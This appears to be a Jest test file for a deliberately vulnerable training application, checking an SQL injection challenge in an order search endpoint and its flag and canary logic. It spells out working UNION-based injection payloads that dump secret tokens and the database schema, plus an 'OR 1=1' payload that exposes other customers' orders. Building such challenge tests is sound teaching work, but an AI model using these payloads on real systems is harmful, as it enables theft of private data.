import {
  apiRequest,
  loginOrFail,
  authHeaders,
  TEST_USERS,
  canaryFrom,
  expectFlag,
} from "../helpers/api";
import { FLAGS } from "../helpers/flags";

interface OrderSearchResponse {
  orders: Record<string, unknown>[];
  error?: string;
  flag?: string;
  message?: string;
}

/** Closes the status filter and pads the UNION to the query's nine columns. */
const union = (column: string, from: string, comment = " --") =>
  `PENDING' UNION SELECT 1, 2, ${column}, 4, 5, 6, 7, 8, 9 ${from}${comment}`;

describe("SQL Injection - Order Search", () => {
  let token: string;

  const search = (status?: string) =>
    apiRequest<OrderSearchResponse>("/api/orders/search", {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify(status === undefined ? {} : { status }),
    });

  beforeAll(async () => {
    token = await loginOrFail(
      TEST_USERS.alice.email,
      TEST_USERS.alice.password
    );
  });

  it("returns the flag once the orders carry the internal canary", async () => {
    const { status, data } = await search(
      union("token", "FROM internal_secrets WHERE slug='sql-injection'")
    );

    expect(status).toBe(200);
    expectFlag(data, FLAGS.SQL_INJECTION);
    expect(JSON.stringify(data.orders)).toContain("CANARY-");
  });

  it("refuses a canary the status filter pasted back in as a literal", async () => {
    const extracted = await search(
      union("token", "FROM internal_secrets WHERE slug='sql-injection'")
    );
    const canary = canaryFrom(extracted.data.orders);

    const { status, data } = await search(union(`'${canary}'`, ""));

    expect(status).toBe(200);
    expect(JSON.stringify(data.orders)).toContain(canary);
    expect(data).not.toHaveProperty("flag");
  });

  it("leaks the schema through the orders, which is how the canary is found", async () => {
    const { status, data } = await search(
      union("group_concat(name)", "FROM sqlite_master WHERE type='table'")
    );

    expect(status).toBe(200);
    expect(JSON.stringify(data.orders)).toContain("internal_secrets");
    expect(data).not.toHaveProperty("flag");
  });

  it("returns other customers' orders without handing out the flag", async () => {
    const { status, data } = await search("PENDING' OR '1'='1");

    expect(status).toBe(200);
    const owners = new Set(data.orders.map((order) => order.userId));
    expect(owners.size).toBeGreaterThan(1);
    expect(data).not.toHaveProperty("flag");
    expect(data.message).toContain("SQL syntax detected");
  });

  it("reports the column count mismatch so the UNION can be tuned", async () => {
    const { status, data } = await search("PENDING' UNION SELECT 1,2 --");

    expect(status).toBe(500);
    expect(data.error).toContain("same number of result columns");
  });

  it("blocks access to the flags table", async () => {
    const { status, data } = await search(
      "PENDING' UNION SELECT flag FROM flags --"
    );

    expect(status).toBe(403);
    expect(data.error).toContain("Access to flags table is not allowed");
  });

  it("blocks the flags table even when the name is schema-qualified", async () => {
    const { status, data } = await search(
      union("group_concat(flag)", "FROM main.flags", "--")
    );

    expect(status).toBe(403);
    expect(data.error).toContain("Access to flags table is not allowed");
  });

  it("filters by status without returning a flag", async () => {
    const { status, data } = await search("PENDING");

    expect(status).toBe(200);
    expect(data).not.toHaveProperty("flag");
    expect(data).not.toHaveProperty("message");
  });

  it("rejects unauthenticated requests", async () => {
    const { status } = await apiRequest("/api/orders/search", {
      method: "POST",
      body: JSON.stringify({ status: "PENDING" }),
    });

    expect(status).toBe(401);
  });
});
